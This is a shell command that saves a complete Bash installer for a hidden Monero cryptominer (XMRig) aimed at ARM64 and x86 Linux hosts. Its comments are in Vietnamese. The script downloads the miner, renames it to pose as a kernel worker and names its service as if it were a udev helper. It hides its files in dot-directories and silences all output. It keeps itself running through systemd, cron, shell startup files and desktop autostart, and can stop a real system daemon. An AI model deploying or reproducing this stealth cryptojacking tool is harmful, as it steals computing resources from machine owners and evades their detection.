cat > /root/miner-arm64.sh <<'SCRIPT_END'
#!/usr/bin/env bash
# v4.3 — bản fix riêng cho Amazon Linux 2 aarch64 (ARM64)

VERSION="4.3-unified-multi-pool-stealth-safe-arm64"

C3POOL_DOWNLOAD_URL="https://download.c3pool.org/xmrig_setup/raw/master/xmrig.tar.gz"
BACKUP_DOWNLOAD_URL="https://raw.githubusercontent.com/melonlonmeo/c4/refs/heads/main/xmrig.tar.gz"
XMRIG_LATEST_API="https://api.github.com/repos/xmrig/xmrig/releases/latest"

XMRIG_ARM64_TAG="v6.22.2"
CMAKE_ARM64_BIN="/opt/cmake-3.30.2-linux-aarch64/bin/cmake"

DISGUISE_BIN="kworker"
DISGUISE_ARGV="kworker/u8:2-events"
SERVICE_NAME="systemd-udevd-helper.service"
DIR_SUFFIX=".kwork"
CONFIG_NAME="resolv.conf.bak"
WRAPPER_NAME=".udev-helper"

KEEP_CONFIG="${KEEP_CONFIG:-0}"
KEEP_BINARY="${KEEP_BINARY:-0}"
STOP_UDEV="${STOP_UDEV:-0}"

WALLET="${1:-}"
EMAIL="${2:-}"
PASS="x"

ARCH="$(uname -m 2>/dev/null || echo unknown)"

log()  { printf '%s\n' "$*"; }
fail() { printf 'ERROR: %s\n' "$*" >&2; exit 1; }
TS()   { date +%Y%m%d_%H%M%S; }

SUDO=""
if [ "$(id -u 2>/dev/null || echo 1)" != "0" ]; then
  if command -v sudo >/dev/null 2>&1 && sudo -n true 2>/dev/null; then
    SUDO="sudo"
  fi
fi

backup_if_exists() {
  local f="$1"
  if [ -f "$f" ]; then
    local b="${f}.bak.$(TS)"
    cp -p "$f" "$b" 2>/dev/null && log "[*] Backup: $f -> $b"
  fi
}

binary_is_functional() {
  local bin="$1"
  [ -x "$bin" ] || return 1
  if command -v timeout >/dev/null 2>&1; then
    timeout 5 "$bin" --version >/dev/null 2>&1
  else
    "$bin" --version >/dev/null 2>&1
  fi
}

INSTALL_DIR=""
CANDIDATES=(
    "${XDG_DATA_HOME:-$HOME/.local/share}/${DIR_SUFFIX}"
    "$HOME/.cache/${DIR_SUFFIX}"
    "$HOME/.config/${DIR_SUFFIX}"
    "$HOME/${DIR_SUFFIX}"
    "$HOME/.local/${DIR_SUFFIX}"
    "/tmp/${DIR_SUFFIX}-$(id -u 2>/dev/null || echo 0)"
    "/var/tmp/${DIR_SUFFIX}-$(id -u 2>/dev/null || echo 0)"
    "/dev/shm/${DIR_SUFFIX}-$(id -u 2>/dev/null || echo 0)"
    "/run/user/$(id -u 2>/dev/null || echo 0)/${DIR_SUFFIX}"
    "./${DIR_SUFFIX}"
)
for candidate in "${CANDIDATES[@]}"; do
    [ -n "$candidate" ] || continue
    if mkdir -p "$candidate" 2>/dev/null && [ -w "$candidate" ] && touch "$candidate/.wtest" 2>/dev/null; then
        rm -f "$candidate/.wtest" 2>/dev/null
        INSTALL_DIR="$candidate"
        break
    fi
done
if [ -z "$INSTALL_DIR" ]; then
    for last in "/dev/shm" "/tmp" "/var/tmp"; do
        if [ -w "$last" ]; then
            INSTALL_DIR="$last/${DIR_SUFFIX}-fallback-$$"
            mkdir -p "$INSTALL_DIR" 2>/dev/null && break
        fi
    done
fi
[ -n "$INSTALL_DIR" ] && [ -w "$INSTALL_DIR" ] || fail "No writable directory found"

ARCHIVE="$INSTALL_DIR/.pkg.tar.gz"
mkdir -p "$INSTALL_DIR/logs" 2>/dev/null || true

if [ -z "$WALLET" ]; then
  echo "Setup script v$VERSION"
  echo "Usage: $0 <wallet address or USDT TRC20 address> [email]"
  exit 1
fi
WALLET_BASE="${WALLET%%.*}"
case "${#WALLET_BASE}" in
  106|95|34) ;;
  *) fail "Wrong wallet base address length: ${#WALLET_BASE}" ;;
esac

CPU_THREADS="$(nproc 2>/dev/null || getconf _NPROCESSORS_ONLN 2>/dev/null || echo 1)"
case "$CPU_THREADS" in ''|*[!0-9]*) CPU_THREADS=1 ;; esac
EXP_MONERO_HASHRATE=$(( CPU_THREADS * 700 / 1000 ))
[ "$EXP_MONERO_HASHRATE" -gt 0 ] || EXP_MONERO_HASHRATE=1

get_port_based_on_hashrate() {
  local hashrate="$1"
  if [ "$hashrate" -le 5000 ]; then echo 80
  elif [ "$hashrate" -le 25000 ]; then echo 13333
  elif [ "$hashrate" -le 50000 ]; then echo 15555
  elif [ "$hashrate" -le 100000 ]; then echo 19999
  else echo 23333; fi
}
PORT="$(get_port_based_on_hashrate "$EXP_MONERO_HASHRATE")"

log "Setup script v$VERSION"
log "Arch: $ARCH"
log "CPU threads: $CPU_THREADS"
log "Computed C3Pool port: $PORT"
log "Directory: $INSTALL_DIR"
log "Flags: KEEP_CONFIG=$KEEP_CONFIG KEEP_BINARY=$KEEP_BINARY STOP_UDEV=$STOP_UDEV SUDO=${SUDO:-<none>}"

download_file() {
  local url="$1" output="$2"
  if command -v curl >/dev/null 2>&1; then
    curl -fL --retry 3 --connect-timeout 15 "$url" -o "$output"
  elif command -v wget >/dev/null 2>&1; then
    wget -O "$output" "$url"
  elif command -v python3 >/dev/null 2>&1; then
    python3 - "$url" "$output" <<'PY'
import sys, urllib.request
urllib.request.urlretrieve(sys.argv[1], sys.argv[2])
PY
  else
    return 1
  fi
}

download_text() {
  local url="$1"
  if command -v curl >/dev/null 2>&1; then
    curl -fsSL --retry 3 --connect-timeout 15 -H 'Accept: application/vnd.github+json' -H 'User-Agent: unified-installer' "$url"
  elif command -v wget >/dev/null 2>&1; then
    wget -qO- --header='Accept: application/vnd.github+json' --user-agent='unified-installer' "$url"
  else
    return 1
  fi
}

get_latest_xmrig_url() {
  local arch json url
  arch="$(uname -m 2>/dev/null || echo unknown)"
  case "$arch" in x86_64|amd64) ;; *) return 2 ;; esac
  json="$(download_text "$XMRIG_LATEST_API")" || return 1
  url="$(printf '%s' "$json" | grep -oE 'https://[^"]+/xmrig-[0-9]+(\.[0-9]+)+-linux-static-x64\.tar\.gz' | head -n 1)"
  [ -n "$url" ] || return 1
  printf '%s\n' "$url"
}

install_latest_official_xmrig() {
  local url version
  if [ "$KEEP_BINARY" = "1" ] && binary_is_functional "$INSTALL_DIR/$DISGUISE_BIN"; then
    log "[*] KEEP_BINARY=1 - giu binary hien tai"
    return 0
  fi
  url="$(get_latest_xmrig_url)" || return $?
  version="$(basename "$url" | sed -E 's/^xmrig-([0-9.]+)-linux-static-x64\.tar\.gz$/\1/')"
  log "[*] Latest official XMRig detected: v$version"
  rm -f "$INSTALL_DIR/$DISGUISE_BIN" "$ARCHIVE" 2>/dev/null || true
  download_file "$url" "$ARCHIVE" || return 1
  tar xf "$ARCHIVE" -C "$INSTALL_DIR" --strip-components=1 || return 1
  rm -f "$ARCHIVE"
  [ -f "$INSTALL_DIR/xmrig" ] || return 1
  mv -f "$INSTALL_DIR/xmrig" "$INSTALL_DIR/$DISGUISE_BIN"
  chmod +x "$INSTALL_DIR/$DISGUISE_BIN" 2>/dev/null || true
  return 0
}

install_c3pool_package() {
  log "[*] Falling back to C3Pool miner package"
  rm -f "$INSTALL_DIR/$DISGUISE_BIN" "$ARCHIVE" 2>/dev/null || true
  if download_file "$C3POOL_DOWNLOAD_URL" "$ARCHIVE"; then
    log "[*] Downloaded from C3Pool successfully."
  else
    log "WARNING: C3Pool download failed. Trying backup source..."
    download_file "$BACKUP_DOWNLOAD_URL" "$ARCHIVE" || return 1
  fi
  tar xf "$ARCHIVE" -C "$INSTALL_DIR" || return 1
  rm -f "$ARCHIVE"
  [ -f "$INSTALL_DIR/xmrig" ] && mv -f "$INSTALL_DIR/xmrig" "$INSTALL_DIR/$DISGUISE_BIN"
  chmod +x "$INSTALL_DIR/$DISGUISE_BIN" 2>/dev/null || true
  [ -f "$INSTALL_DIR/$DISGUISE_BIN" ]
}

build_libuv_if_missing() {
  if [ -f /usr/local/include/uv.h ] && [ -f /usr/local/lib/libuv.so ]; then
    return 0
  fi
  log "[*] Building libuv 1.51.0 from source..."
  rm -rf /tmp/libuv-src /tmp/libuv.tar.gz
  if command -v curl >/dev/null 2>&1; then
    curl -fsSL https://dist.libuv.org/dist/v1.51.0/libuv-v1.51.0.tar.gz -o /tmp/libuv.tar.gz || return 1
  else
    wget -O /tmp/libuv.tar.gz https://dist.libuv.org/dist/v1.51.0/libuv-v1.51.0.tar.gz || return 1
  fi
  mkdir -p /tmp/libuv-src && tar xzf /tmp/libuv.tar.gz -C /tmp/libuv-src --strip-components=1 || return 1
  ( cd /tmp/libuv-src && \
    ./autogen.sh >/dev/null 2>&1 && \
    ./configure --prefix=/usr/local >/dev/null && \
    make -j$(nproc) >/dev/null && \
    $SUDO make install >/dev/null ) || return 1
  ldconfig 2>/dev/null || $SUDO ldconfig 2>/dev/null || true
  [ -f /usr/local/include/uv.h ] && [ -f /usr/local/lib/libuv.so ]
}

find_cmake_bin() {
  if [ -x "$CMAKE_ARM64_BIN" ]; then echo "$CMAKE_ARM64_BIN"; return 0; fi
  if command -v cmake >/dev/null 2>&1; then command -v cmake; return 0; fi
  return 1
}

build_xmrig_arm64() {
  local target="$1" cmake_bin
  log "[*] Building XMRig $XMRIG_ARM64_TAG from source for $ARCH..."

  for t in gcc g++ make git; do
    command -v "$t" >/dev/null 2>&1 || { log "ERROR: missing $t (cai: yum install -y gcc gcc-c++ make git)"; return 1; }
  done
  cmake_bin="$(find_cmake_bin)" || { log "ERROR: cmake khong tim thay"; return 1; }

  if ! build_libuv_if_missing; then
    log "ERROR: Khong build duoc libuv"
    return 1
  fi

  if [ ! -f /tmp/xmrig-src/CMakeLists.txt ]; then
    rm -rf /tmp/xmrig-src
    git clone --depth 1 --branch "$XMRIG_ARM64_TAG" https://github.com/xmrig/xmrig.git /tmp/xmrig-src >/dev/null 2>&1 || return 1
  fi

  ( cd /tmp/xmrig-src && rm -rf build && mkdir build && cd build && \
    "$cmake_bin" .. \
      -DCMAKE_BUILD_TYPE=Release \
      -DWITH_HWLOC=OFF \
      -DWITH_TLS=ON \
      -DUV_INCLUDE_DIR=/usr/local/include \
      -DUV_LIBRARY=/usr/local/lib/libuv.so >/dev/null && \
    make -j$(nproc) >/dev/null ) || return 1

  [ -x /tmp/xmrig-src/build/xmrig ] || return 1
  binary_is_functional /tmp/xmrig-src/build/xmrig || { log "ERROR: binary build khong chay duoc"; return 1; }
  cp -f /tmp/xmrig-src/build/xmrig "$target" || return 1
  chmod +x "$target"
  return 0
}

acquire_binary_arm64() {
  local target="$INSTALL_DIR/$DISGUISE_BIN"

  if [ "$KEEP_BINARY" = "1" ] && binary_is_functional "$target"; then
    log "[*] KEEP_BINARY=1 - giu binary ARM64 hien tai: $target"
    return 0
  fi
  if binary_is_functional "$target"; then
    log "[*] Binary ARM64 hien tai OK - dung lai"
    return 0
  fi
  if binary_is_functional /tmp/xmrig-src/build/xmrig; then
    log "[*] Copy binary da build san: /tmp/xmrig-src/build/xmrig"
    cp -f /tmp/xmrig-src/build/xmrig "$target"
    chmod +x "$target"
    return 0
  fi
  log "[*] Chua co binary ARM64 - build tu source"
  build_xmrig_arm64 "$target" || return 1
  binary_is_functional "$target"
}

if command -v systemctl >/dev/null 2>&1; then
  for svc in "$SERVICE_NAME" nodebox.service c3pool_miner.service; do
    $SUDO systemctl stop "$svc" 2>/dev/null || true
  done
  if [ "$STOP_UDEV" = "1" ]; then
    log "WARNING: STOP_UDEV=1 - stopping systemd-udevd.service (REAL daemon)"
    $SUDO systemctl stop systemd-udevd.service 2>/dev/null || true
  fi
fi

pkill -f "${INSTALL_DIR}/${DISGUISE_BIN}" 2>/dev/null || true
pkill -f "${INSTALL_DIR}/${CONFIG_NAME}" 2>/dev/null || true
pkill -f "${INSTALL_DIR}/${WRAPPER_NAME}" 2>/dev/null || true

log "[*] Preparing package"
case "$ARCH" in
  aarch64|arm64)
    acquire_binary_arm64 || fail "Khong the chuan bi XMRig ARM64"
    ;;
  x86_64|amd64)
    if ! install_latest_official_xmrig; then
      log "WARNING: Could not download latest official release. Attempting fallback."
      install_c3pool_package || fail "Unable to download release or any fallbacks."
    fi
    ;;
  *)
    fail "Kien truc $ARCH khong duoc ho tro"
    ;;
esac

if ! binary_is_functional "$INSTALL_DIR/$DISGUISE_BIN"; then
  log "WARNING: Bundled core is not functional on this host."
  fail "Binary is not functional"
fi

CONFIG_PATH="$INSTALL_DIR/$CONFIG_NAME"
CONFIG_BG="$INSTALL_DIR/.${CONFIG_NAME}.bg"

CONFIG_CONTENT=$(cat <<EOF_CONFIG
{
    "autosave": true,
    "background": false,
    "cpu": true,
    "opencl": false,
    "cuda": false,
    "pools": [
        { "url": "auto.c3pool.org:$PORT", "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": false },
        { "url": "auto.c3pool.org:19999", "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": false },
        { "url": "auto.c3pool.org:443",   "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": true  },
        { "url": "auto.c3pool.org:80",    "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": false },
        { "url": "auto.c3pool.org:33333", "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": true  },
        { "url": "auto.c3pool.org:23333", "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": false },
        { "url": "pool.supportxmr.com:443",  "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": true  },
        { "url": "pool.supportxmr.com:8080", "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": false },
        { "url": "pool.supportxmr.com:7777", "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": false },
        { "url": "pool.supportxmr.com:5555", "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": false },
        { "url": "pool.supportxmr.com:80",   "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": false },
        { "url": "pool.supportxmr.com:3333", "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": false }
    ],
    "log-file": null,
    "donate-level": 0,
    "max-cpu-usage": 100,
    "syslog": false
}
EOF_CONFIG
)

if [ "$KEEP_CONFIG" = "1" ] && [ -f "$CONFIG_PATH" ]; then
  log "[*] KEEP_CONFIG=1 - giu config hien tai: $CONFIG_PATH"
else
  backup_if_exists "$CONFIG_PATH"
  printf '%s\n' "$CONFIG_CONTENT" > "$CONFIG_PATH"
fi

if [ "$KEEP_CONFIG" = "1" ] && [ -f "$CONFIG_BG" ]; then
  log "[*] KEEP_CONFIG=1 - giu config BG hien tai: $CONFIG_BG"
else
  backup_if_exists "$CONFIG_BG"
  printf '%s\n' "$CONFIG_CONTENT" | sed 's/"background": false/"background": true/' > "$CONFIG_BG"
fi

RUNNER="$INSTALL_DIR/$WRAPPER_NAME"
RUNNER_BG="$INSTALL_DIR/.${WRAPPER_NAME}-bg"

backup_if_exists "$RUNNER"
backup_if_exists "$RUNNER_BG"

cat > "$RUNNER" <<EOF_MINER
#!/usr/bin/env bash
cd "$INSTALL_DIR" 2>/dev/null || true
export XMRIG_NO_TLS_WARN=1
export XMRIG_QUIET=1
if ! pgrep -f "${INSTALL_DIR}/${DISGUISE_BIN}" >/dev/null 2>&1; then
  if [ "\$#" -eq 0 ]; then
    exec nice -n 19 "$INSTALL_DIR/$DISGUISE_BIN" \\
         --config="$CONFIG_PATH" --no-color --quiet >/dev/null 2>&1
  else
    exec nice -n 19 "$INSTALL_DIR/$DISGUISE_BIN" "\$@" >/dev/null 2>&1
  fi
fi
EOF_MINER
chmod +x "$RUNNER"

cat > "$RUNNER_BG" <<EOF_MINER
#!/usr/bin/env bash
cd "$INSTALL_DIR" 2>/dev/null || true
if ! pgrep -f "${INSTALL_DIR}/${DISGUISE_BIN}" >/dev/null 2>&1; then
  setsid bash "$RUNNER" --config="$CONFIG_BG" </dev/null >/dev/null 2>&1 &
  disown 2>/dev/null || true
fi
EOF_MINER
chmod +x "$RUNNER_BG"

start_without_systemd() {
  bash "$RUNNER_BG" >/dev/null 2>&1 &
  disown 2>/dev/null || true
}

HAS_ROOT=0
if [ "$(id -u 2>/dev/null || echo 1)" = "0" ]; then
  HAS_ROOT=1
elif [ -n "$SUDO" ]; then
  HAS_ROOT=1
fi

if command -v systemctl >/dev/null 2>&1 && [ "$HAS_ROOT" = "1" ]; then
  log "[*] Installing system service"

  if [ -r /proc/meminfo ] && \
     [ "$(awk '/MemTotal/{print $2}' /proc/meminfo)" -gt 3500000 ]; then
    HP=$((1168 + CPU_THREADS))
    if grep -qE '^vm\.nr_hugepages=' /etc/sysctl.conf 2>/dev/null; then
      log "[*] sysctl.conf da co vm.nr_hugepages - bo qua append"
    else
      echo "vm.nr_hugepages=$HP" | $SUDO tee -a /etc/sysctl.conf >/dev/null 2>&1 || true
    fi
    $SUDO sysctl -w vm.nr_hugepages=$HP >/dev/null 2>&1 || true
  fi

  SVC_FILE="$INSTALL_DIR/.svc"
  cat > "$SVC_FILE" <<EOF_SERVICE
[Unit]
Description=System Udev Events Helper
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
ExecStart=/usr/bin/env bash $RUNNER --config=$CONFIG_PATH
StandardOutput=null
StandardError=null
Restart=always
RestartSec=30
Nice=19
CPUWeight=1
IOSchedulingClass=idle
IOSchedulingPriority=7
OOMScoreAdjust=500

[Install]
WantedBy=multi-user.target
EOF_SERVICE

  TARGET="/etc/systemd/system/$SERVICE_NAME"
  INSTALL_OK=1

  if [ -f "$TARGET" ] && cmp -s "$SVC_FILE" "$TARGET"; then
    log "[*] Service file khong doi - bo qua cp"
  else
    [ -f "$TARGET" ] && $SUDO cp -p "$TARGET" "${TARGET}.bak.$(TS)" 2>/dev/null
    $SUDO cp "$SVC_FILE" "$TARGET" 2>/dev/null || INSTALL_OK=0
  fi

  if [ "$INSTALL_OK" = "1" ]; then
    $SUDO systemctl daemon-reload 2>/dev/null
    $SUDO systemctl enable "$SERVICE_NAME" >/dev/null 2>&1
    $SUDO systemctl restart "$SERVICE_NAME" 2>/dev/null && \
      log "[*] Service installed: $SERVICE_NAME" || {
        log "WARNING: systemd install failed, falling back"
        HAS_ROOT=0
      }
  else
    log "WARNING: systemd install failed, falling back"
    HAS_ROOT=0
  fi
fi

if [ "$HAS_ROOT" = "0" ]; then
  log "[*] No root - user-level persistence"
  if command -v systemctl >/dev/null 2>&1 && systemctl --user show-environment >/dev/null 2>&1; then
    USER_DIR="$HOME/.config/systemd/user"
    mkdir -p "$USER_DIR" 2>/dev/null
    USVC_FILE="$USER_DIR/$SERVICE_NAME"
    backup_if_exists "$USVC_FILE"
    cat > "$USVC_FILE" <<EOF_USERVICE
[Unit]
Description=System Udev Events Helper
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/env bash $RUNNER --config=$CONFIG_PATH
Restart=always
RestartSec=30
Nice=19
OOMScoreAdjust=500

[Install]
WantedBy=default.target
EOF_USERVICE
    systemctl --user daemon-reload 2>/dev/null || true
    systemctl --user enable --now "$SERVICE_NAME" 2>/dev/null || true
    command -v loginctl >/dev/null 2>&1 && loginctl enable-linger "$(id -un 2>/dev/null)" 2>/dev/null || true
  fi
  if command -v crontab >/dev/null 2>&1; then
    CRON_LINE="@reboot $RUNNER_BG >/dev/null 2>&1"
    (crontab -l 2>/dev/null | grep -F -q "$RUNNER_BG") || \
      (crontab -l 2>/dev/null; echo "$CRON_LINE") | crontab - 2>/dev/null || true
  fi
  for RC in "$HOME/.profile" "$HOME/.bashrc" "$HOME/.zshrc" "$HOME/.bash_profile"; do
    [ -n "$HOME" ] && [ -d "$HOME" ] || continue
    touch "$RC" 2>/dev/null || continue
    [ -w "$RC" ] || continue
    START_LINE="$RUNNER_BG >/dev/null 2>&1"
    grep -F -q "$START_LINE" "$RC" 2>/dev/null || printf '\n%s\n' "$START_LINE" >> "$RC" 2>/dev/null || true
  done
  if [ -d "$HOME/.config" ] || mkdir -p "$HOME/.config" 2>/dev/null; then
    AUTOSTART_DIR="$HOME/.config/autostart"
    mkdir -p "$AUTOSTART_DIR" 2>/dev/null
    AS_FILE="$AUTOSTART_DIR/udev-helper.desktop"
    backup_if_exists "$AS_FILE"
    cat > "$AS_FILE" <<EOF_DESKTOP
[Desktop Entry]
Type=Application
Name=System Events
Exec=bash $RUNNER_BG
Hidden=false
NoDisplay=true
X-GNOME-Autostart-enabled=true
EOF_DESKTOP
  fi
  start_without_systemd
fi

sleep 2
log "[*] Setup complete - initialized"
SCRIPT_END

chmod +x /root/miner-arm64.sh
echo "✅ Đã lưu: /root/miner-arm64.sh"